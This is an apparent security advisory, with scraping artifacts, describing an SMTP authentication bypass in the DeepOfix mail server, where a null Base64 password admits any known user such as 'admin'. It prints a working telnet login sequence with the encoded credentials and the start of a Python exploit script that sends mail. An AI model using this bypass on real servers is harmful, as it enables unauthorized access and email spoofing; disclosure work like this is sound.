Background ， DeepOfix is a free ISO of DeepRootLinux to mount a mail server providing users the ， ability to send emails via SMTP , check e-mail via IMAP , access the files via FTP or ， SSH. ， 2. Problem Description ， The vulnerability allows an attacker to bypass the authentication in the SMTP server ， to send emails. The problem is that the SMTP server performs authentication against ， LDAP by default , and the service does not check that the password is null if this ， Base64. This creates a connection \"anonymous\" but with a user account without entering ， the password. ， It is important to note that the same could be used with other services also ， validate against LDAP. ， 3. Impact ， An Attacker could login in the SMTP server knowing only the username of one user in the ， server and he could sends emails. One important thing is that the user \"admin\" always ， exists in the server. ， 4. Expotation ， To authenticate against the SMTP server can make the login is done using Base64 , so if ， you enter the user \"admin\" and password null or '\\0' in Base64 give us access server as ， \"admin\" without checking the password. ， The credentials in Base64 :  ， User : \"admin\" => \"YWRtaW4=\" ， Password : null => \"AA=\" ， Example of how we could authenticate to the system :  ， test @ 0-day ~  $ telnet deepofix.local 25 ， Trying deepofix.local. ， Connected to deepofix.local. ， Escape character is '^ ] '. ， 220 deepofix.local ESMTP ， auth login # In ASCCI :  ， 334 VXNlcm5hbWU6 # 334 Username :  ， YWRtaW4= # admin ， 334 UGFzc3dvcmQ6 # 334 Password :  ， AA= # \\0 ， 235 nice to meet you ， Now we would be authenticated as \"admin\" so we could send emails from that account. ， Simple exploit in Python [ exploit.py ]  :  ，  | import smtplib |  ，  |  # Select the sender and the receivers |  ，  | sender = 'sender @ mail' |  ，  | receivers = [ 'receiver @ mail.com' ]  |  ，  |  # Write the message |  ，  | message = \" |  ，  | From : From Sender <sender @ mail.com> |  ，  | To : To Receiver <receiver @ mail.com> |  ，  | Subject : NSA is watching you !  |  ，  | This is a really important message. xD |  ，  | \" |  ，  |  # Connect to the SMTP server and send the email | ",
